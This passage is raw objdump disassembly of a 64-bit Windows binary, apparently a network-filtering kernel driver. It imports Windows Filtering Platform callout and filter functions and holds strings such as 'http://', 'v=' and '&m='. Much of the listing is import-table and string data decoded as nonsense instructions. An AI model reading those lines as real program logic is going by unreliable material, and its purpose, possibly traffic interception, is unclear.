   1400078cd:	43                   	rex.XB
   1400078ce:	65 72 74             	gs jb  0x140007945
   1400078d1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%rsi),%esp
   1400078d8:	73 5c                	jae    0x140007936
   1400078da:	00 cc                	add    %cl,%ah
   1400078dc:	cc                   	int3
   1400078dd:	cc                   	int3
   1400078de:	cc                   	int3
   1400078df:	cc                   	int3
   1400078e0:	42 00 6c 00 6f       	add    %bpl,0x6f(%rax,%r8,1)
   1400078e5:	00 62 00             	add    %ah,0x0(%rdx)
   1400078e8:	00 00                	add    %al,(%rax)
   1400078ea:	cc                   	int3
   1400078eb:	cc                   	int3
   1400078ec:	cc                   	int3
   1400078ed:	cc                   	int3
   1400078ee:	cc                   	int3
   1400078ef:	cc                   	int3
   1400078f0:	76 3d                	jbe    0x14000792f
   1400078f2:	00 cc                	add    %cl,%ah
   1400078f4:	cc                   	int3
   1400078f5:	cc                   	int3
   1400078f6:	cc                   	int3
   1400078f7:	cc                   	int3
   1400078f8:	cc                   	int3
   1400078f9:	cc                   	int3
   1400078fa:	cc                   	int3
   1400078fb:	cc                   	int3
   1400078fc:	cc                   	int3
   1400078fd:	cc                   	int3
   1400078fe:	cc                   	int3
   1400078ff:	cc                   	int3
   140007900:	26 6d                	es insl (%dx),(%rdi)
   140007902:	3d 00 cc cc cc       	cmp    $0xcccccc00,%eax
   140007907:	cc                   	int3
   140007908:	cc                   	int3
   140007909:	cc                   	int3
   14000790a:	cc                   	int3
   14000790b:	cc                   	int3
   14000790c:	cc                   	int3
   14000790d:	cc                   	int3
   14000790e:	cc                   	int3
   14000790f:	cc                   	int3
   140007910:	68 74 74 70 3a       	push   $0x3a707474
   140007915:	2f                   	(bad)
   140007916:	2f                   	(bad)
	...

Disassembly of section INIT:

0000000140015000 <INIT>:
   140015000:	48 8b 05 d9 50 ff ff 	mov    -0xaf27(%rip),%rax        # 0x14000a0e0
   140015007:	45 33 c9             	xor    %r9d,%r9d
   14001500a:	49 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%r8
   140015011:	2b 00 00 
   140015014:	48 85 c0             	test   %rax,%rax
   140015017:	74 05                	je     0x14001501e
   140015019:	49 3b c0             	cmp    %r8,%rax
   14001501c:	75 38                	jne    0x140015056
   14001501e:	0f 31                	rdtsc
   140015020:	48 c1 e2 20          	shl    $0x20,%rdx
   140015024:	48 8d 0d b5 50 ff ff 	lea    -0xaf4b(%rip),%rcx        # 0x14000a0e0
   14001502b:	48 0b c2             	or     %rdx,%rax
   14001502e:	48 33 c1             	xor    %rcx,%rax
   140015031:	48 89 05 a8 50 ff ff 	mov    %rax,-0xaf58(%rip)        # 0x14000a0e0
   140015038:	66 44 89 0d a6 50 ff 	mov    %r9w,-0xaf5a(%rip)        # 0x14000a0e6
   14001503f:	ff 
   140015040:	48 8b 05 99 50 ff ff 	mov    -0xaf67(%rip),%rax        # 0x14000a0e0
   140015047:	48 85 c0             	test   %rax,%rax
   14001504a:	75 0a                	jne    0x140015056
   14001504c:	49 8b c0             	mov    %r8,%rax
   14001504f:	48 89 05 8a 50 ff ff 	mov    %rax,-0xaf76(%rip)        # 0x14000a0e0
   140015056:	48 f7 d0             	not    %rax
   140015059:	48 89 05 88 50 ff ff 	mov    %rax,-0xaf78(%rip)        # 0x14000a0e8
   140015060:	c3                   	ret
   140015061:	cc                   	int3
   140015062:	cc                   	int3
   140015063:	cc                   	int3
   140015064:	18 51 01             	sbb    %dl,0x1(%rcx)
	...
   14001506f:	00 d4                	add    %dl,%ah
   140015071:	55                   	push   %rbp
   140015072:	01 00                	add    %eax,(%rax)
   140015074:	50                   	push   %rax
   140015075:	80 00 00             	addb   $0x0,(%rax)
   140015078:	a8 51                	test   $0x51,%al
   14001507a:	01 00                	add    %eax,(%rax)
	...
   140015084:	ee                   	out    %al,(%dx)
   140015085:	5b                   	pop    %rbx
   140015086:	01 00                	add    %eax,(%rax)
   140015088:	e0 80                	loopne 0x14001500a
   14001508a:	00 00                	add    %al,(%rax)
   14001508c:	c8 50 01 00          	enter  $0x150,$0x0
	...
   140015098:	4a 5c                	rex.WX pop %rsp
   14001509a:	01 00                	add    %eax,(%rax)
   14001509c:	00 80 00 00 f0 50    	add    %al,0x50f00000(%rax)
   1400150a2:	01 00                	add    %eax,(%rax)
	...
   1400150ac:	d0 5c 01 00          	rcrb   $1,0x0(%rcx,%rax,1)
   1400150b0:	28 80 00 00 00 00    	sub    %al,0x0(%rax)
	...
   1400150c6:	00 00                	add    %al,(%rax)
   1400150c8:	0a 5c 01 00          	or     0x0(%rcx,%rax,1),%bl
   1400150cc:	00 00                	add    %al,(%rax)
   1400150ce:	00 00                	add    %al,(%rax)
   1400150d0:	22 5c 01 00          	and    0x0(%rcx,%rax,1),%bl
   1400150d4:	00 00                	add    %al,(%rax)
   1400150d6:	00 00                	add    %al,(%rax)
   1400150d8:	3a 5c 01 00          	cmp    0x0(%rcx,%rax,1),%bl
   1400150dc:	00 00                	add    %al,(%rax)
   1400150de:	00 00                	add    %al,(%rax)
   1400150e0:	fc                   	cld
   1400150e1:	5b                   	pop    %rbx
   1400150e2:	01 00                	add    %eax,(%rax)
	...
   1400150f0:	90                   	nop
   1400150f1:	5c                   	pop    %rsp
   1400150f2:	01 00                	add    %eax,(%rax)
   1400150f4:	00 00                	add    %al,(%rax)
   1400150f6:	00 00                	add    %al,(%rax)
   1400150f8:	a2 5c 01 00 00 00 00 	movabs %al,0xb80000000000015c
   1400150ff:	00 b8 
   140015101:	5c                   	pop    %rsp
   140015102:	01 00                	add    %eax,(%rax)
   140015104:	00 00                	add    %al,(%rax)
   140015106:	00 00                	add    %al,(%rax)
   140015108:	7c 5c                	jl     0x140015166
   14001510a:	01 00                	add    %eax,(%rax)
	...
   140015118:	10 55 01             	adc    %dl,0x1(%rbp)
   14001511b:	00 00                	add    %al,(%rax)
   14001511d:	00 00                	add    %al,(%rax)
   14001511f:	00 22                	add    %ah,(%rdx)
   140015121:	55                   	push   %rbp
   140015122:	01 00                	add    %eax,(%rax)
   140015124:	00 00                	add    %al,(%rax)
   140015126:	00 00                	add    %al,(%rax)
   140015128:	3a 55 01             	cmp    0x1(%rbp),%dl
   14001512b:	00 00                	add    %al,(%rax)
   14001512d:	00 00                	add    %al,(%rax)
   14001512f:	00 fe                	add    %bh,%dh
   140015131:	54                   	push   %rsp
   140015132:	01 00                	add    %eax,(%rax)
   140015134:	00 00                	add    %al,(%rax)
   140015136:	00 00                	add    %al,(%rax)
   140015138:	76 55                	jbe    0x14001518f
   14001513a:	01 00                	add    %eax,(%rax)
   14001513c:	00 00                	add    %al,(%rax)
   14001513e:	00 00                	add    %al,(%rax)
   140015140:	8e 55 01             	mov    0x1(%rbp),%ss
   140015143:	00 00                	add    %al,(%rax)
   140015145:	00 00                	add    %al,(%rax)
   140015147:	00 b6 55 01 00 00    	add    %dh,0x155(%rsi)
   14001514d:	00 00                	add    %al,(%rax)
   14001514f:	00 e2                	add    %ah,%dl
   140015151:	54                   	push   %rsp
   140015152:	01 00                	add    %eax,(%rax)
   140015154:	00 00                	add    %al,(%rax)
   140015156:	00 00                	add    %al,(%rax)
   140015158:	ce                   	(bad)
   140015159:	54                   	push   %rsp
   14001515a:	01 00                	add    %eax,(%rax)
   14001515c:	00 00                	add    %al,(%rax)
   14001515e:	00 00                	add    %al,(%rax)
   140015160:	b6 54                	mov    $0x54,%dh
   140015162:	01 00                	add    %eax,(%rax)
   140015164:	00 00                	add    %al,(%rax)
   140015166:	00 00                	add    %al,(%rax)
   140015168:	9c                   	pushf
   140015169:	54                   	push   %rsp
   14001516a:	01 00                	add    %eax,(%rax)
   14001516c:	00 00                	add    %al,(%rax)
   14001516e:	00 00                	add    %al,(%rax)
   140015170:	84 54 01 00          	test   %dl,0x0(%rcx,%rax,1)
   140015174:	00 00                	add    %al,(%rax)
   140015176:	00 00                	add    %al,(%rax)
   140015178:	70 54                	jo     0x1400151ce
   14001517a:	01 00                	add    %eax,(%rax)
   14001517c:	00 00                	add    %al,(%rax)
   14001517e:	00 00                	add    %al,(%rax)
   140015180:	5e                   	pop    %rsi
   140015181:	54                   	push   %rsp
   140015182:	01 00                	add    %eax,(%rax)
   140015184:	00 00                	add    %al,(%rax)
   140015186:	00 00                	add    %al,(%rax)
   140015188:	40 54                	rex push %rsp
   14001518a:	01 00                	add    %eax,(%rax)
   14001518c:	00 00                	add    %al,(%rax)
   14001518e:	00 00                	add    %al,(%rax)
   140015190:	58                   	pop    %rax
   140015191:	55                   	push   %rbp
   140015192:	01 00                	add    %eax,(%rax)
   140015194:	00 00                	add    %al,(%rax)
   140015196:	00 00                	add    %al,(%rax)
   140015198:	28 54 01 00          	sub    %dl,0x0(%rcx,%rax,1)
	...
   1400151a8:	ac                   	lods   (%rsi),%al
   1400151a9:	56                   	push   %rsi
   1400151aa:	01 00                	add    %eax,(%rax)
   1400151ac:	00 00                	add    %al,(%rax)
   1400151ae:	00 00                	add    %al,(%rax)
   1400151b0:	c0 56 01 00          	rclb   $0x0,0x1(%rsi)
   1400151b4:	00 00                	add    %al,(%rax)
   1400151b6:	00 00                	add    %al,(%rax)
   1400151b8:	d8 56 01             	fcoms  0x1(%rsi)
   1400151bb:	00 00                	add    %al,(%rax)
   1400151bd:	00 00                	add    %al,(%rax)
   1400151bf:	00 e8                	add    %ch,%al
   1400151c1:	56                   	push   %rsi
   1400151c2:	01 00                	add    %eax,(%rax)
   1400151c4:	00 00                	add    %al,(%rax)
   1400151c6:	00 00                	add    %al,(%rax)
   1400151c8:	f8                   	clc
   1400151c9:	56                   	push   %rsi
   1400151ca:	01 00                	add    %eax,(%rax)
   1400151cc:	00 00                	add    %al,(%rax)
   1400151ce:	00 00                	add    %al,(%rax)
   1400151d0:	08 57 01             	or     %dl,0x1(%rdi)
   1400151d3:	00 00                	add    %al,(%rax)
   1400151d5:	00 00                	add    %al,(%rax)
   1400151d7:	00 14 57             	add    %dl,(%rdi,%rdx,2)
   1400151da:	01 00                	add    %eax,(%rax)
   1400151dc:	00 00                	add    %al,(%rax)
   1400151de:	00 00                	add    %al,(%rax)
   1400151e0:	30 57 01             	xor    %dl,0x1(%rdi)
   1400151e3:	00 00                	add    %al,(%rax)
   1400151e5:	00 00                	add    %al,(%rax)
   1400151e7:	00 4c 57 01          	add    %cl,0x1(%rdi,%rdx,2)
   1400151eb:	00 00                	add    %al,(%rax)
   1400151ed:	00 00                	add    %al,(%rax)
   1400151ef:	00 64 57 01          	add    %ah,0x1(%rdi,%rdx,2)
   1400151f3:	00 00                	add    %al,(%rax)
   1400151f5:	00 00                	add    %al,(%rax)
   1400151f7:	00 7e 57             	add    %bh,0x57(%rsi)
   1400151fa:	01 00                	add    %eax,(%rax)
   1400151fc:	00 00                	add    %al,(%rax)
   1400151fe:	00 00                	add    %al,(%rax)
   140015200:	96                   	xchg   %eax,%esi
   140015201:	57                   	push   %rdi
   140015202:	01 00                	add    %eax,(%rax)
   140015204:	00 00                	add    %al,(%rax)
   140015206:	00 00                	add    %al,(%rax)
   140015208:	a4                   	movsb  (%rsi),(%rdi)
   140015209:	57                   	push   %rdi
   14001520a:	01 00                	add    %eax,(%rax)
   14001520c:	00 00                	add    %al,(%rax)
   14001520e:	00 00                	add    %al,(%rax)
   140015210:	b2 57                	mov    $0x57,%dl
   140015212:	01 00                	add    %eax,(%rax)
   140015214:	00 00                	add    %al,(%rax)
   140015216:	00 00                	add    %al,(%rax)
   140015218:	bc 57 01 00 00       	mov    $0x157,%esp
   14001521d:	00 00                	add    %al,(%rax)
   14001521f:	00 d0                	add    %dl,%al
   140015221:	57                   	push   %rdi
   140015222:	01 00                	add    %eax,(%rax)
   140015224:	00 00                	add    %al,(%rax)
   140015226:	00 00                	add    %al,(%rax)
   140015228:	da 57 01             	ficoml 0x1(%rdi)
   14001522b:	00 00                	add    %al,(%rax)
   14001522d:	00 00                	add    %al,(%rax)
   14001522f:	00 e4                	add    %ah,%ah
   140015231:	57                   	push   %rdi
   140015232:	01 00                	add    %eax,(%rax)
   140015234:	00 00                	add    %al,(%rax)
   140015236:	00 00                	add    %al,(%rax)
   140015238:	f0 57                	lock push %rdi
   14001523a:	01 00                	add    %eax,(%rax)
   14001523c:	00 00                	add    %al,(%rax)
   14001523e:	00 00                	add    %al,(%rax)
   140015240:	fa                   	cli
   140015241:	57                   	push   %rdi
   140015242:	01 00                	add    %eax,(%rax)
   140015244:	00 00                	add    %al,(%rax)
   140015246:	00 00                	add    %al,(%rax)
   140015248:	0a 58 01             	or     0x1(%rax),%bl
   14001524b:	00 00                	add    %al,(%rax)
   14001524d:	00 00                	add    %al,(%rax)
   14001524f:	00 20                	add    %ah,(%rax)
   140015251:	58                   	pop    %rax
   140015252:	01 00                	add    %eax,(%rax)
   140015254:	00 00                	add    %al,(%rax)
   140015256:	00 00                	add    %al,(%rax)
   140015258:	30 58 01             	xor    %bl,0x1(%rax)
   14001525b:	00 00                	add    %al,(%rax)
   14001525d:	00 00                	add    %al,(%rax)
   14001525f:	00 40 58             	add    %al,0x58(%rax)
   140015262:	01 00                	add    %eax,(%rax)
   140015264:	00 00                	add    %al,(%rax)
   140015266:	00 00                	add    %al,(%rax)
   140015268:	4c 58                	rex.WR pop %rax
   14001526a:	01 00                	add    %eax,(%rax)
   14001526c:	00 00                	add    %al,(%rax)
   14001526e:	00 00                	add    %al,(%rax)
   140015270:	5a                   	pop    %rdx
   140015271:	58                   	pop    %rax
   140015272:	01 00                	add    %eax,(%rax)
   140015274:	00 00                	add    %al,(%rax)
   140015276:	00 00                	add    %al,(%rax)
   140015278:	72 58                	jb     0x1400152d2
   14001527a:	01 00                	add    %eax,(%rax)
   14001527c:	00 00                	add    %al,(%rax)
   14001527e:	00 00                	add    %al,(%rax)
   140015280:	80 58 01 00          	sbbb   $0x0,0x1(%rax)
   140015284:	00 00                	add    %al,(%rax)
   140015286:	00 00                	add    %al,(%rax)
   140015288:	8e 58 01             	mov    0x1(%rax),%ds
   14001528b:	00 00                	add    %al,(%rax)
   14001528d:	00 00                	add    %al,(%rax)
   14001528f:	00 80 56 01 00 00    	add    %al,0x156(%rax)
   140015295:	00 00                	add    %al,(%rax)
   140015297:	00 bc 58 01 00 00 00 	add    %bh,0x1(%rax,%rbx,2)
   14001529e:	00 00                	add    %al,(%rax)
   1400152a0:	d6                   	udb
   1400152a1:	58                   	pop    %rax
   1400152a2:	01 00                	add    %eax,(%rax)
   1400152a4:	00 00                	add    %al,(%rax)
   1400152a6:	00 00                	add    %al,(%rax)
   1400152a8:	e0 58                	loopne 0x140015302
   1400152aa:	01 00                	add    %eax,(%rax)
   1400152ac:	00 00                	add    %al,(%rax)
   1400152ae:	00 00                	add    %al,(%rax)
   1400152b0:	ee                   	out    %al,(%dx)
   1400152b1:	58                   	pop    %rax
   1400152b2:	01 00                	add    %eax,(%rax)
   1400152b4:	00 00                	add    %al,(%rax)
   1400152b6:	00 00                	add    %al,(%rax)
   1400152b8:	06                   	(bad)
   1400152b9:	59                   	pop    %rcx
   1400152ba:	01 00                	add    %eax,(%rax)
   1400152bc:	00 00                	add    %al,(%rax)
   1400152be:	00 00                	add    %al,(%rax)
   1400152c0:	1e                   	(bad)
   1400152c1:	59                   	pop    %rcx
   1400152c2:	01 00                	add    %eax,(%rax)
   1400152c4:	00 00                	add    %al,(%rax)
   1400152c6:	00 00                	add    %al,(%rax)
   1400152c8:	38 59 01             	cmp    %bl,0x1(%rcx)
   1400152cb:	00 00                	add    %al,(%rax)
   1400152cd:	00 00                	add    %al,(%rax)
   1400152cf:	00 52 59             	add    %dl,0x59(%rdx)
   1400152d2:	01 00                	add    %eax,(%rax)
   1400152d4:	00 00                	add    %al,(%rax)
   1400152d6:	00 00                	add    %al,(%rax)
   1400152d8:	6a 59                	push   $0x59
   1400152da:	01 00                	add    %eax,(%rax)
   1400152dc:	00 00                	add    %al,(%rax)
   1400152de:	00 00                	add    %al,(%rax)
   1400152e0:	82                   	(bad)
   1400152e1:	59                   	pop    %rcx
   1400152e2:	01 00                	add    %eax,(%rax)
   1400152e4:	00 00                	add    %al,(%rax)
   1400152e6:	00 00                	add    %al,(%rax)
   1400152e8:	9e                   	sahf
   1400152e9:	59                   	pop    %rcx
   1400152ea:	01 00                	add    %eax,(%rax)
   1400152ec:	00 00                	add    %al,(%rax)
   1400152ee:	00 00                	add    %al,(%rax)
   1400152f0:	a8 59                	test   $0x59,%al
   1400152f2:	01 00                	add    %eax,(%rax)
   1400152f4:	00 00                	add    %al,(%rax)
   1400152f6:	00 00                	add    %al,(%rax)
   1400152f8:	b2 59                	mov    $0x59,%dl
   1400152fa:	01 00                	add    %eax,(%rax)
   1400152fc:	00 00                	add    %al,(%rax)
   1400152fe:	00 00                	add    %al,(%rax)
   140015300:	bc 59 01 00 00       	mov    $0x159,%esp
   140015305:	00 00                	add    %al,(%rax)
   140015307:	00 da                	add    %bl,%dl
   140015309:	59                   	pop    %rcx
   14001530a:	01 00                	add    %eax,(%rax)
   14001530c:	00 00                	add    %al,(%rax)
   14001530e:	00 00                	add    %al,(%rax)
   140015310:	f8                   	clc
   140015311:	59                   	pop    %rcx
   140015312:	01 00                	add    %eax,(%rax)
   140015314:	00 00                	add    %al,(%rax)
   140015316:	00 00                	add    %al,(%rax)
   140015318:	16                   	(bad)
   140015319:	5a                   	pop    %rdx
   14001531a:	01 00                	add    %eax,(%rax)
   14001531c:	00 00                	add    %al,(%rax)
   14001531e:	00 00                	add    %al,(%rax)
   140015320:	36 5a                	ss pop %rdx
   140015322:	01 00                	add    %eax,(%rax)
   140015324:	00 00                	add    %al,(%rax)
   140015326:	00 00                	add    %al,(%rax)
   140015328:	4c 5a                	rex.WR pop %rdx
   14001532a:	01 00                	add    %eax,(%rax)
   14001532c:	00 00                	add    %al,(%rax)
   14001532e:	00 00                	add    %al,(%rax)
   140015330:	5c                   	pop    %rsp
   140015331:	5a                   	pop    %rdx
   140015332:	01 00                	add    %eax,(%rax)
   140015334:	00 00                	add    %al,(%rax)
   140015336:	00 00                	add    %al,(%rax)
   140015338:	74 5a                	je     0x140015394
   14001533a:	01 00                	add    %eax,(%rax)
   14001533c:	00 00                	add    %al,(%rax)
   14001533e:	00 00                	add    %al,(%rax)
   140015340:	82                   	(bad)
   140015341:	5a                   	pop    %rdx
   140015342:	01 00                	add    %eax,(%rax)
   140015344:	00 00                	add    %al,(%rax)
   140015346:	00 00                	add    %al,(%rax)
   140015348:	8e 5a 01             	mov    0x1(%rdx),%ds
   14001534b:	00 00                	add    %al,(%rax)
   14001534d:	00 00                	add    %al,(%rax)
   14001534f:	00 9c 5a 01 00 00 00 	add    %bl,0x1(%rdx,%rbx,2)
   140015356:	00 00                	add    %al,(%rax)
   140015358:	ae                   	scas   (%rdi),%al
   140015359:	5a                   	pop    %rdx
   14001535a:	01 00                	add    %eax,(%rax)
   14001535c:	00 00                	add    %al,(%rax)
   14001535e:	00 00                	add    %al,(%rax)
   140015360:	be 5a 01 00 00       	mov    $0x15a,%esi
   140015365:	00 00                	add    %al,(%rax)
   140015367:	00 d8                	add    %bl,%al
   140015369:	5a                   	pop    %rdx
   14001536a:	01 00                	add    %eax,(%rax)
   14001536c:	00 00                	add    %al,(%rax)
   14001536e:	00 00                	add    %al,(%rax)
   140015370:	e8 5a 01 00 00       	call   0x1400154cf
   140015375:	00 00                	add    %al,(%rax)
   140015377:	00 08                	add    %cl,(%rax)
   140015379:	5b                   	pop    %rbx
   14001537a:	01 00                	add    %eax,(%rax)
   14001537c:	00 00                	add    %al,(%rax)
   14001537e:	00 00                	add    %al,(%rax)
   140015380:	18 5b 01             	sbb    %bl,0x1(%rbx)
   140015383:	00 00                	add    %al,(%rax)
   140015385:	00 00                	add    %al,(%rax)
   140015387:	00 32                	add    %dh,(%rdx)
   140015389:	5b                   	pop    %rbx
   14001538a:	01 00                	add    %eax,(%rax)
   14001538c:	00 00                	add    %al,(%rax)
   14001538e:	00 00                	add    %al,(%rax)
   140015390:	52                   	push   %rdx
   140015391:	5b                   	pop    %rbx
   140015392:	01 00                	add    %eax,(%rax)
   140015394:	00 00                	add    %al,(%rax)
   140015396:	00 00                	add    %al,(%rax)
   140015398:	70 5b                	jo     0x1400153f5
   14001539a:	01 00                	add    %eax,(%rax)
   14001539c:	00 00                	add    %al,(%rax)
   14001539e:	00 00                	add    %al,(%rax)
   1400153a0:	88 5b 01             	mov    %bl,0x1(%rbx)
   1400153a3:	00 00                	add    %al,(%rax)
   1400153a5:	00 00                	add    %al,(%rax)
   1400153a7:	00 a0 5b 01 00 00    	add    %ah,0x15b(%rax)
   1400153ad:	00 00                	add    %al,(%rax)
   1400153af:	00 b6 5b 01 00 00    	add    %dh,0x15b(%rsi)
   1400153b5:	00 00                	add    %al,(%rax)
   1400153b7:	00 d2                	add    %dl,%dl
   1400153b9:	5b                   	pop    %rbx
   1400153ba:	01 00                	add    %eax,(%rax)
   1400153bc:	00 00                	add    %al,(%rax)
   1400153be:	00 00                	add    %al,(%rax)
   1400153c0:	e2 5b                	loop   0x14001541d
   1400153c2:	01 00                	add    %eax,(%rax)
   1400153c4:	00 00                	add    %al,(%rax)
   1400153c6:	00 00                	add    %al,(%rax)
   1400153c8:	94                   	xchg   %eax,%esp
   1400153c9:	56                   	push   %rsi
   1400153ca:	01 00                	add    %eax,(%rax)
   1400153cc:	00 00                	add    %al,(%rax)
   1400153ce:	00 00                	add    %al,(%rax)
   1400153d0:	6c                   	insb   (%dx),(%rdi)
   1400153d1:	56                   	push   %rsi
   1400153d2:	01 00                	add    %eax,(%rax)
   1400153d4:	00 00                	add    %al,(%rax)
   1400153d6:	00 00                	add    %al,(%rax)
   1400153d8:	54                   	push   %rsp
   1400153d9:	56                   	push   %rsi
   1400153da:	01 00                	add    %eax,(%rax)
   1400153dc:	00 00                	add    %al,(%rax)
   1400153de:	00 00                	add    %al,(%rax)
   1400153e0:	46 56                	rex.RX push %rsi
   1400153e2:	01 00                	add    %eax,(%rax)
   1400153e4:	00 00                	add    %al,(%rax)
   1400153e6:	00 00                	add    %al,(%rax)
   1400153e8:	2e 56                	cs push %rsi
   1400153ea:	01 00                	add    %eax,(%rax)
   1400153ec:	00 00                	add    %al,(%rax)
   1400153ee:	00 00                	add    %al,(%rax)
   1400153f0:	54                   	push   %rsp
   1400153f1:	5c                   	pop    %rsp
   1400153f2:	01 00                	add    %eax,(%rax)
   1400153f4:	00 00                	add    %al,(%rax)
   1400153f6:	00 00                	add    %al,(%rax)
   1400153f8:	64 5c                	fs pop %rsp
   1400153fa:	01 00                	add    %eax,(%rax)
   1400153fc:	00 00                	add    %al,(%rax)
   1400153fe:	00 00                	add    %al,(%rax)
   140015400:	0e                   	(bad)
   140015401:	56                   	push   %rsi
   140015402:	01 00                	add    %eax,(%rax)
   140015404:	00 00                	add    %al,(%rax)
   140015406:	00 00                	add    %al,(%rax)
   140015408:	f6 55 01             	notb   0x1(%rbp)
   14001540b:	00 00                	add    %al,(%rax)
   14001540d:	00 00                	add    %al,(%rax)
   14001540f:	00 e2                	add    %ah,%dl
   140015411:	55                   	push   %rbp
   140015412:	01 00                	add    %eax,(%rax)
   140015414:	00 00                	add    %al,(%rax)
   140015416:	00 00                	add    %al,(%rax)
   140015418:	a6                   	cmpsb  (%rdi),(%rsi)
   140015419:	58                   	pop    %rax
   14001541a:	01 00                	add    %eax,(%rax)
	...
   140015428:	a3 00 46 77 70 73 43 	movabs %eax,0x6c61437370774600
   14001542f:	61 6c 
   140015431:	6c                   	insb   (%dx),(%rdi)
   140015432:	6f                   	outsl  (%rsi),(%dx)
   140015433:	75 74                	jne    0x1400154a9
   140015435:	52                   	push   %rdx
   140015436:	65 67 69 73 74 65 72 	imul   $0x317265,%gs:0x74(%ebx),%esi
   14001543d:	31 00 
   14001543f:	00 a7 00 46 77 70    	add    %ah,0x70774600(%rdi)
   140015445:	73 43                	jae    0x14001548a
   140015447:	61                   	(bad)
   140015448:	6c                   	insb   (%dx),(%rdi)
   140015449:	6c                   	insb   (%dx),(%rdi)
   14001544a:	6f                   	outsl  (%rsi),(%dx)
   14001544b:	75 74                	jne    0x1400154c1
   14001544d:	55                   	push   %rbp
   14001544e:	6e                   	outsb  (%rsi),(%dx)
   14001544f:	72 65                	jb     0x1400154b6
   140015451:	67 69 73 74 65 72 42 	imul   $0x79427265,0x74(%ebx),%esi
   140015458:	79 
   140015459:	49                   	rex.WB
   14001545a:	64 30 00             	xor    %al,%fs:(%rax)
   14001545d:	00 2d 00 46 77 70    	add    %ch,0x70774600(%rip)        # 0x1b0789a63
   140015463:	6d                   	insl   (%dx),(%rdi)
   140015464:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140015466:	67 69 6e 65 4f 70 65 	imul   $0x6e65704f,0x65(%esi),%ebp
   14001546d:	6e 
   14001546e:	30 00                	xor    %al,(%rax)
   140015470:	2a 00                	sub    (%rax),%al
   140015472:	46 77 70             	rex.RX ja 0x1400154e5
   140015475:	6d                   	insl   (%dx),(%rdi)
   140015476:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140015478:	67 69 6e 65 43 6c 6f 	imul   $0x736f6c43,0x65(%esi),%ebp
   14001547f:	73 
   140015480:	65 30 00             	xor    %al,%gs:(%rax)
   140015483:	00 76 00             	add    %dh,0x0(%rsi)
   140015486:	46 77 70             	rex.RX ja 0x1400154f9
   140015489:	6d                   	insl   (%dx),(%rdi)
   14001548a:	54                   	push   %rsp
   14001548b:	72 61                	jb     0x1400154ee
   14001548d:	6e                   	outsb  (%rsi),(%dx)
   14001548e:	73 61                	jae    0x1400154f1
   140015490:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   140015494:	6e                   	outsb  (%rsi),(%dx)
   140015495:	42                   	rex.X
   140015496:	65 67 69 6e 30 00 77 	imul   $0x46007700,%gs:0x30(%esi),%ebp
   14001549d:	00 46 
   14001549f:	77 70                	ja     0x140015511
   1400154a1:	6d                   	insl   (%dx),(%rdi)
   1400154a2:	54                   	push   %rsp
   1400154a3:	72 61                	jb     0x140015506
   1400154a5:	6e                   	outsb  (%rsi),(%dx)
   1400154a6:	73 61                	jae    0x140015509
   1400154a8:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   1400154ac:	6e                   	outsb  (%rsi),(%dx)
   1400154ad:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400154af:	6d                   	insl   (%dx),(%rdi)
   1400154b0:	6d                   	insl   (%dx),(%rdi)
   1400154b1:	69 74 30 00 00 75 00 	imul   $0x46007500,0x0(%rax,%rsi,1),%esi
   1400154b8:	46 
   1400154b9:	77 70                	ja     0x14001552b
   1400154bb:	6d                   	insl   (%dx),(%rdi)
   1400154bc:	54                   	push   %rsp
   1400154bd:	72 61                	jb     0x140015520
   1400154bf:	6e                   	outsb  (%rsi),(%dx)
   1400154c0:	73 61                	jae    0x140015523
   1400154c2:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   1400154c6:	6e                   	outsb  (%rsi),(%dx)
   1400154c7:	41 62 6f 72 74 30    	(bad)
   1400154cd:	00 6d 00             	add    %ch,0x0(%rbp)
   1400154d0:	46 77 70             	rex.RX ja 0x140015543
   1400154d3:	6d                   	insl   (%dx),(%rdi)
   1400154d4:	53                   	push   %rbx
   1400154d5:	75 62                	jne    0x140015539
   1400154d7:	4c 61                	rex.WR (bad)
   1400154d9:	79 65                	jns    0x140015540
   1400154db:	72 41                	jb     0x14001551e
   1400154dd:	64 64 30 00          	fs xor %al,%fs:(%rax)
   1400154e1:	00 6f 00             	add    %ch,0x0(%rdi)
   1400154e4:	46 77 70             	rex.RX ja 0x140015557
   1400154e7:	6d                   	insl   (%dx),(%rdi)
   1400154e8:	53                   	push   %rbx
   1400154e9:	75 62                	jne    0x14001554d
   1400154eb:	4c 61                	rex.WR (bad)
   1400154ed:	79 65                	jns    0x140015554
   1400154ef:	72 44                	jb     0x140015535
   1400154f1:	65 6c                	gs insb (%dx),(%rdi)
   1400154f3:	65 74 65             	gs je  0x14001555b
   1400154f6:	42 79 4b             	rex.X jns 0x140015544
   1400154f9:	65 79 30             	gs jns 0x14001552c
   1400154fc:	00 00                	add    %al,(%rax)
   1400154fe:	19 00                	sbb    %eax,(%rax)
   140015500:	46 77 70             	rex.RX ja 0x140015573
   140015503:	6d                   	insl   (%dx),(%rdi)
   140015504:	43 61                	rex.XB (bad)
   140015506:	6c                   	insb   (%dx),(%rdi)
   140015507:	6c                   	insb   (%dx),(%rdi)
   140015508:	6f                   	outsl  (%rsi),(%dx)
   140015509:	75 74                	jne    0x14001557f
   14001550b:	41                   	rex.B
   14001550c:	64 64 30 00          	fs xor %al,%fs:(%rax)
   140015510:	30 00                	xor    %al,(%rax)
   140015512:	46 77 70             	rex.RX ja 0x140015585
   140015515:	6d                   	insl   (%dx),(%rdi)
   140015516:	46 69 6c 74 65 72 41 	imul   $0x64644172,0x65(%rsp,%r14,2),%r13d
   14001551d:	64 64 
   14001551f:	30 00                	xor    %al,(%rax)
   140015521:	00 32                	add    %dh,(%rdx)
   140015523:	00 46 77             	add    %al,0x77(%rsi)
   140015526:	70 6d                	jo     0x140015595
   140015528:	46 69 6c 74 65 72 44 	imul   $0x6c654472,0x65(%rsp,%r14,2),%r13d
   14001552f:	65 6c 
   140015531:	65 74 65             	gs je  0x140015599
   140015534:	42 79 49             	rex.X jns 0x140015580
   140015537:	64 30 00             	xor    %al,%fs:(%rax)
   14001553a:	96                   	xchg   %eax,%esi
   14001553b:	00 46 77             	add    %al,0x77(%rsi)
   14001553e:	70 73                	jo     0x1400155b3
   140015540:	41 63 71 75          	movsxd 0x75(%r9),%esi
